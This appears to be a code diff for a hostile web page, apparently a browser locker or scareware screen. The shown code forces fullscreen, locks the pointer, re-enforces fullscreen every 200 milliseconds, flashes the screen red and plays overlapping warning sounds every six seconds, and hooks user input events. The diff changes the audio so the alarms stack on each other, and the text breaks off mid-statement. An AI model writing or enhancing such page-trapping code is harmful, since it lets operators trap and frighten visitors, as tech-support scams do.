@@ -72,9 +72,10 @@
   const body = document.body;
   const warningAudio = document.getElementById("warningAudio");
 
+  // Play overlapping copy of warning.wav
   function playWarning() {
-    warningAudio.currentTime = 0;
-    warningAudio.play().catch(()=>{});
+    const audioClone = warningAudio.cloneNode();
+    audioClone.play().catch(()=>{});
   }
 
   function requestFS() {
@@ -98,15 +99,19 @@
 
   function flashScreen() {
     body.style.background = 'red';
-    playWarning();
+    playWarning(); // play overlapping
     setTimeout(() => body.style.background = '', 500);
   }
 
+  // Initialize
   requestFS();
   lockPointer();
   playWarning();
 
+  // Keep fullscreen enforced
   setInterval(() => enforceFullscreen(), 200);
+
+  // Flash and sound every 6s
   setInterval(flashScreen, 6000);
 
   ["click","keydown","pointerdown","touchstart","mousemove"].forEach(evt => {
